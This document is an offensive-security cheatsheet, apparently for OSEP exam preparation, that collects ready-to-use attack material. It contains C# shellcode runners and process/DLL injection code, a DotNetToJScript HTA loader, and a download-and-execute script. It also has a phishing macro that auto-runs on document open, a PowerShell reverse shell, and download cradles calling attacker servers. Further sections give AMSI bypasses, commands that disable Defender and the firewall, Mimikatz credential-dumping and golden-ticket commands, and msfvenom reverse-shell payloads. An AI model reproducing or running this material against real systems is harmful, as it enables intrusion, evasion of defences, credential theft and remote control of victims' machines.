# OSEP Cheatsheet
#### purg3
Under Construction
***
A cheatsheet compiled so you have everything you need in one place. I'd like to say thank you to all the authors of the repo's listed here, without you this would not exist.


***
# DotNetToJscript

## Replace testclass.cs with following code and replace shellcode

```csharp
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
[ComVisible(true)]
public class TestClass
{
[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr
lpThreadId);
[DllImport("kernel32.dll")]
static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32dwMilliseconds);
public TestClass()
{
	byte[] buf = new byte[626] {
		0xfc,0x48,0x83,0xe4,0xf0,0xe8...
	int size = buf.Length;
	IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
	Marshal.Copy(buf, 0, addr, size);
	IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr,IntPtr.Zero, 0,
IntPtr.Zero);
```
<br>
<br>

## Build
```
DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o runner.js
```
<br>
<br>

## Create HTA file
```javascript
<head> 
<script language="JScript"> 
function setversion() { 
new ActiveXObject('WScript.Shell').Environment('Process')('COMPLUS_Version') = 'v4.0.30319'; } 
function debug(s) {} 
function base64ToStream(b) { 
			var enc = new ActiveXObject("System.Text.ASCIIEncoding"); 				
			var length = enc.GetByteCount_2(b); 
			var ba = enc.GetBytes_4(b); 
			var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform"); ba = transform.TransformFinalBlock(ba, 0, length); 
			var ms = new ActiveXObject("System.IO.MemoryStream"); 
			ms.Write(ba, 0, (length / 4) * 3); 
			ms.Position = 0; 
			return ms; 
}
			
var serialized_obj = "REPLACE_HERE";
			
var entry_class = 'TestClass'; 
try { 
			setversion(); 
			var stm = base64ToStream(serialized_obj); 
			var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter'); 
			var al = new ActiveXObject('System.Collections.ArrayList'); 
			var d = fmt.Deserialize_2(stm); 
			al.Add(undefined); 
			var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
			
} catch (e) {
			debug(e.message);
} 
</script> 
</head>
<body> 
<script language="JScript"> 
self.close(); 
</script> 
</body> 
</html>
```
<br>
<br>

# CSharp

#### Building *.cs code
```
csc sharp.cs output
```
or

[Visual Studio](https://visualstudio.microsoft.com/)
<br>
<br>

## DLL Injection

```csharp
using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;

namespace Inject
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int
processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint
dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr
lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint
dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true,
SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        static void Main(string[] args)
        {

        String dir =
Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
        String dllName = dir + "\\your.dll";

        WebClient wc = new WebClient();
        wc.DownloadFile("http://Your_Server/your.dll", dllName);

        Process[] expProc = Process.GetProcessesByName("explorer");
        int pid = expProc[0].Id;

        IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);
        IntPtr outSize;
        Boolean res = WriteProcessMemory(hProcess, addr,
Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);
        IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"),
"LoadLibraryA");
        IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib,
addr, 0, IntPtr.Zero);
        }
    }
}
```
<br>
<br>

## Shellcode Runner

```csharp
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace ConsoleApp1
{

        class Program
        {
            [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
            static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint
flAllocationType, uint flProtect);

            [DllImport("kernel32.dll")]
            static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

            [DllImport("kernel32.dll")]
            static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32
dwMilliseconds);

            static void Main(string[] args)
            {

                byte[] buf = new byte[YOUR_SIZE] {YOUR_SHELLCODE};

                int size = buf.Length;

                IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

                Marshal.Copy(buf, 0, addr, size);

                IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0,
IntPtr.Zero);

                WaitForSingleObject(hThread, 0xFFFFFFFF);
            }
    }
}
```
<br>
<br>

## Process injection

```csharp
using System;
using System.Runtime.InteropServices;
namespace Inject
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int
processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint
dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
        byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr
lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint
dwCreationFlags, IntPtr lpThreadId);

        static void Main(string[] args)
        {
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, 4804);
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            byte[] buf = new byte[YOUR_SIZE] {YOUR_SHELLCODE};
                IntPtr outSize;
                WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);

                IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr,
IntPtr.Zero, 0, IntPtr.Zero);
        }
    }
}

```
<br>
<br>


<br>

# Javascript

## Download&Execute

```javascript
var url = "http://YOUR_SERVER/YOUR.exe"
var Object = WScript.CreateObject('MSXML2.XMLHTTP');

Object.Open('GET', url, false);
Object.Send();

if (Object.Status == 200)
{
    var Stream = WScript.CreateObject('ADODB.Stream');

    Stream.Open();
    Stream.Type = 1;
    Stream.Write(Object.ResponseBody);
    Stream.Position = 0;

    Stream.SaveToFile("met.exe", 2);
    Stream.Close();
}

var r = new ActiveXObject("WScript.Shell").Run("YOUR.exe");
```
<br>
<br>


# Phishing

## Macro

- ### Obfuscate however you want
- This macro is now detected as for the .bat and .txt they are still good to go as of 20FEB2022

```
Sub rev()

    Dim str As String
    str = "powershell -c Start-bitstransfer -source http://ip:port/revsh.bat -destination c:\\path\of\your choice\"
    Shell str, vbHide
    Dim revshell As String
    revshell = "c:\\path\of\transfered\file"
    Shell revshell, vbHide
    
End Sub

Sub Document_Open()
    rev
End Sub

Sub AutoOpen()
    rev
End Sub

Sub Auto_Open()
    rev
End Sub••••ˇˇˇˇ
```

## Reverse Shell

- ### Replace ip/port, save as .txt file and host on your server

```powershell
function cleanup {
if ($client.Connected -eq $true) {$client.Close()}
if ($process.ExitCode -ne $null) {$process.Close()}
exit}
// Setup IPADDR
$address = '192.168.1.13'
// Setup PORT
$port = '4242'
$client = New-Object system.net.sockets.tcpclient
$client.connect($address,$port)
$stream = $client.GetStream()
$networkbuffer = New-Object System.Byte[] $client.ReceiveBufferSize
$process = New-Object System.Diagnostics.Process
$process.StartInfo.FileName = 'C:\\windows\\system32\\cmd.exe'
$process.StartInfo.RedirectStandardInput = 1
$process.StartInfo.RedirectStandardOutput = 1
$process.StartInfo.UseShellExecute = 0
$process.Start()
$inputstream = $process.StandardInput
$outputstream = $process.StandardOutput
Start-Sleep 1
$encoding = new-object System.Text.AsciiEncoding
while($outputstream.Peek() -ne -1){$out += $encoding.GetString($outputstream.Read())}
$stream.Write($encoding.GetBytes($out),0,$out.Length)
$out = $null; $done = $false; $testing = 0;
while (-not $done) {
if ($client.Connected -ne $true) {cleanup}
$pos = 0; $i = 1
while (($i -gt 0) -and ($pos -lt $networkbuffer.Length)) {
$read = $stream.Read($networkbuffer,$pos,$networkbuffer.Length - $pos)
$pos+=$read; if ($pos -and ($networkbuffer[0..$($pos-1)] -contains 10)) {break}}
if ($pos -gt 0) {
$string = $encoding.GetString($networkbuffer,0,$pos)
$inputstream.write($string)
start-sleep 1
if ($process.ExitCode -ne $null) {cleanup}
else {
$out = $encoding.GetString($outputstream.Read())
while($outputstream.Peek() -ne -1){
$out += $encoding.GetString($outputstream.Read()); if ($out -eq $string) {$out = ''}}
$stream.Write($encoding.GetBytes($out),0,$out.length)
$out = $null
$string = $null}} else {cleanup}}
```

## Bringing it home

- ### Save file as .bat and host on your server

```
powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://ip:port/ps.txt')"
```

```
When the macro is clicked it will first download the .bat file and execute.
Then the .bat file will download and execute your .txt file resulting in a revshell
```

# Powershell
<br>

## Download file:
```
(New-Object System.Net.WebClient).DownloadFile("http://192.168.119.155/PowerUp.ps1", "C:\Windows\Temp\PowerUp.ps1")
```

 <br>
 
## Powershell Cradle:

```
iex(new-object net.webclient).downloadstring('http://192.168.49.68/<ToolName>.ps1')
```

<br>

## Constrained lang mode:

```
$ExecutionContext.SessionState.LanguageMode
```
<br>

## CLM Bypass:

```
Installutil.exe /logfile= /LogToConsole=false /U "c:\temp\bypass-clm.exe"
```
<br>

## Disable Restricted Admin:

```powershell
Remove-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name
DisableRestrictedAdmin
```
<br>
<br>

## Disable AMSI
 <br>
 
 ### Method 1:
```
(([Ref].Assembly.gettypes() | ? {$_.Name -like "Amsi*utils"}).GetFields("NonPublic,Static") | ? {$_.Name -like "amsiInit*ailed"}).SetValue($null,$true)
```
<br>

### Method 2:
```powershell
[Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True)
```
<br>

### Method 3:
```powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1);

```
<br>
<br>

## Load C# assembly reflectively:

## Download and run assembly without arguments
```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/rev.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[rev.Program]::Main()
```
<br>

## Download and run Rubeus, with arguments (make sure to split the args)
```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/Rubeus.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Rubeus.Program]::Main("s4u /user:web01$ /rc4:1d77f43d9604e79e5626c6905705801e /impersonateuser:administrator /msdsspn:cifs/file01 /ptt".Split())
```
<br>

## Execute a specific method from an assembly (e.g. a DLL)
```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/lib.dll')
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```
<br>
<br>

# Active Directory

[Cheatsheet 1](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet#asreproast)

[Cheatsheet 2](https://casvancooten.com/posts/2020/11/windows-active-directory-exploitation-cheat-sheet-and-command-reference/)

[Cheatsheet 3](https://book.hacktricks.xyz/windows/active-directory-methodology)

[Cheatsheet 4](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md)

<br>
<br>


# Windows

### Useful links

[Windows Priv esc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#applocker-enumeration)

[lolbas](https://lolbas-project.github.io/#)

```
Installutil.exe /logfile= /LogToConsole=false /U "c:\temp\payload.exe"
```
<br>

### Remove definitions
```
C:\Program Files\Windows Defender>.\MpCmdRun.exe -removedefinitions -all
```
<br>

### Disable Defender / Firewall
```powershell
Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true 
NetSh Advfirewall set allprofiles state off
```
<br>
<br>

# Linux

### Useful links

[Linux Priv esc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md)
 
 ### Full TTY:
 
 ```
 python -c 'import pty; pty.spawn("/bin/bash")'
 ^Z
 stty raw -echo && fg
 reset
 ```
 
 ### Sendmail:
 ```
 sendmail -f attacker@email.com -t victim@email.com -s 192.168.x.x -u "Subject" -m "body"
```
<br>
<br>

# Impacket 
[Cheatsheet 1](https://cheatsheet.haax.fr/windows-systems/exploitation/impacket/)

[Cheatsheet 2](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)

[Cheatsheet 3](https://www.puckiestyle.nl/impacket/)
<br>
<br>


# TortugaToolKit

### Load DLL Remote:

```powershell
$a=[System.Reflection.Assembly]::Load($(IWR -Uri http://yourserver/tortugatoolkit.dll -UseBasicParsing).Content);
Import-Module -Assembly $a
```

<br>

### Load DLL local:

```powershell
$a=[System.Reflection.Assembly]::Load($(C:\Path\To\DLL); import-module -assembly $a
```

<br>

### Remote load&encrypt&processhollow:

```powershell
$code = Invoke-EncryptShellcode -shellcode $(IWR -Uri 'http://ip/shellcode.bin' -usebasicparsing).Content
INVPH -encsh $code.encryptedShellcode -k $code.encryptionKey -ivk $code.initVectorKey -pn 'svchost.exe' -Verbose
```

<br>

### Impersonating process token&processhollow:

```powershell
$code = Invoke-EncryptShellcode -shellcode $(IWR -Uri 'http://ip/shellcode.bin' -usebasicparsing).Content
```

```powershell
Invoke-ImpersonateProcessHollow -processId 1092 -exe "svchost.exe" -decryptKey $code.encryptionKey -shellCode $code.encryptedShellcode -initVector $code.initVectorKey
```
 
 <br>

- ### Disable AMSI:

```
Disable-AyEmEsEye -verbose
```
<br>

- ### Disable Defender:

```
Disable-DefenderForEndpoint
```
<br>

- ### Cmdlets

```powershell
Disable-AyEmEsEye
Disable-DefenderForEndpoint
Disable-Etw
Enable-DefenderForEndpoint
Enable-Privileges
Get-ActiveDirectoryComputers
Get-ActiveDirectoryForests
Get-ActiveDirectoryGroupMembership
Get-ActiveDirectoryGroups
Get-ActiveDirectoryUsers
Get-CurrentIdentity
Get-MsSQLQuery
Get-SQLInfo
Get-System
Get-TrustedInstaller
Invoke-UnhookDll
Invoke-AdminCheck
Invoke-AssemblyLoader
Invoke-ClassicInjection
Invoke-FileLessLateralMovement
Invoke-LsaSecretsDmp
Invoke-MsSQLAssembly
Invoke-MsSQLShell
Invoke-PingSweep
Invoke-ProcessHollow
Invoke-ShellcodeEncryption
Invoke-TokenStealer
Invoke-TurtleDump
Invoke-TurtleHound
Invoke-TurtleUp
Invoke-TurtleView
Invoke-ImpersonateProcessHollow
Invoke-ImpersonateToken
Show-AvailableTokens
Undo-Impersonation
```
<br>
<br>

# PowerUpSQL


[Cheatsheet 1](https://github.com/tacom6/PowerUpSQL/blob/master/PowerUpSQL-CheatSheet.md)

[Cheatsheet 2](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)

[Cheatsheet 3](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)

<br>
<br>

# MimiKatz

- ### general
```
privilege::debug
log
log customlogfilename.log
```

- ### sekurlsa
```
sekurlsa::logonpasswords
sekurlsa::logonPasswords full
sekurlsa::tickets /export
sekurlsa::pth /user:Administrateur /domain:winxp /ntlm:f193d757b4d487ab7e5a3743f038f713 /run:cmd
```

- ### kerberos
```
kerberos::list /export
kerberos::ptt c:\chocolate.kirbi
kerberos::golden /admin:administrateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /ticket:chocolate.kirbi
```

- ### crypto
```
crypto::capi
crypto::cng
crypto::certificates /export
crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE
crypto::keys /export
crypto::keys /machine /export
```

 - ### vault & lsadump
```
vault::cred
vault::list
token::elevate
vault::cred
vault::list
lsadump::sam
lsadump::secrets
lsadump::cache
token::revert
lsadump::dcsync /user:domain\krbtgt /domain:lab.local
```

- ### pth
```
sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a
sekurlsa::pth /user:Administrateur /domain:chocolate.local /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9
sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9
sekurlsa::pth /user:Administrator /domain:WOSHUB /ntlm:{NTLM_hash} /run:cmd.exe
```


- ### ekeys
```
sekurlsa::ekeys
```

- ### dpapi
```
sekurlsa::dpapi
```

- ### minidump
```
sekurlsa::minidump lsass.dmp
```

- ### ptt
```
kerberos::ptt Administrateur@krbtgt-CHOCOLATE.LOCAL.kirbi
```

- ### golden/silver
```
kerberos::golden /user:utilisateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /id:1107 /groups:513 /ticket:utilisateur.chocolate.kirbi
kerberos::golden /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /aes256:15540cac73e94028231ef86631bc47bd5c827847ade468d6f6f739eb00c68e42 /user:Administrateur /id:500 /groups:513,512,520,518,519 /ptt /startoffset:-10 /endin:600 /renewmax:10080
kerberos::golden /admin:Administrator /domain:CTU.DOMAIN /sid:S-1-1-12-123456789-1234567890-123456789 /krbtgt:deadbeefboobbabe003133700009999 /ticket:Administrator.kiribi
```

- ### tgt
 ```
kerberos::tgt
```
- ### purge
```
kerberos::purge
```
<br>
<br>

# Rubeus

[Cheatsheet 1](https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a)

[Cheatsheet 2](https://github.com/GhostPack/Rubeus)

[Cheatsheet 3](https://www.puckiestyle.nl/kerberos-cheatsheet/)
<br>
<br>
# Metasploit

```
sudo msfvenom -p windows/x64/meterpreter/reverse_http lhost=192.168.x.x lport=8080 EXITFUNC=thread -f csharp
```

```
sudo msfconsole -qx "use exploit/multi/handler ;set payload windows/meterpreter/reverse_tcp; set lhost tun0; set lport 4444;exploit;"
```

```
sudo msfconsole -qx "use exploit/multi/handler ;set payload linux/x86/meterpreter/reverse_tcp; set lhost tun0; set lport 4444;exploit;"
```

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.x.x lport=4444 -f exe -o 4444.exe
```

```
msfvenom -p linux/x86/meterpreter/reverse_tcp lhost=192.168.x.x lport=4444 -f elf -o lin-4444
```

```
msfvenom -p windows/x64/meterpreter/reverse_https lhost=192.168.x.x lport=4444 -f exe -o 4444.exe
```

```
msfvenom -p linux/x86/meterpreter/reverse_https lhost=192.168.x.x lport=4444 -f elf -o lin-4444
```

<br>
<br>

### autorun

```
set autoroute 'route 172.16.x.0/24';
```


<br>
<br>

# Tools

[SeatBelt](https://github.com/GhostPack/Seatbelt)

[Winpwn](https://github.com/S3cur3Th1sSh1t/WinPwn)

[SCShell](https://github.com/Mr-Un1k0d3r/SCShell)

[SharpShooter](https://github.com/mdsecactivebreach/SharpShooter)

[SharpImpersonation](https://github.com/S3cur3Th1sSh1t/SharpImpersonation)

[SharpCradle](https://github.com/anthemtotheego/SharpCradle)

[SharpMove](https://github.com/0xthirteen/SharpMove)

[Chameleon](https://github.com/klezVirus/chameleon)

[DotNetToJScript](https://github.com/tyranid/DotNetToJScript)

[ISESteroids](https://powershell.one/isesteroids/quickstart/install)

[Nishang](https://github.com/samratashok/nishang)

[PPLKiller](https://github.com/Mattiwatti/PPLKiller)

[Code-Snippets](https://github.com/chvancooten/OSEP-Code-Snippets)

[Neo-ConfuserEX](https://github.com/XenocodeRCE/neo-ConfuserEx)

[Bypass-CLM](https://github.com/calebstewart/bypass-clm)

[BloodHound](https://github.com/BloodHoundAD/BloodHound)

[LAPSToolKit](https://github.com/leoloobeek/LAPSToolkit)

[PSPY](https://github.com/DominicBreuker/pspy)

[LSE](https://github.com/diego-treitos/linux-smart-enumeration)

[HiveNightmare](https://github.com/GossiTheDog/HiveNightmare)

[Chisel](https://github.com/jpillora/chisel)

[WinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)

[DAMP](https://github.com/HarmJ0y/DAMP)

[SharpBypassUAC](https://github.com/FatRodzianko/SharpBypassUAC)

[SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse)

[PrintNightmare](https://github.com/nemo-wq/PrintNightmare-CVE-2021-34527)

[SpoolSample](https://github.com/leechristensen/SpoolSample)

[Impacket](https://github.com/SecureAuthCorp/impacket)

[PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)

[Rubeus](https://github.com/GhostPack/Rubeus)

[MimiKatz](https://gist.github.com/insi2304/484a4e92941b437bad961fcacda82d49)

[Powermad](https://github.com/Kevin-Robertson/Powermad)

[PowerSploit](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
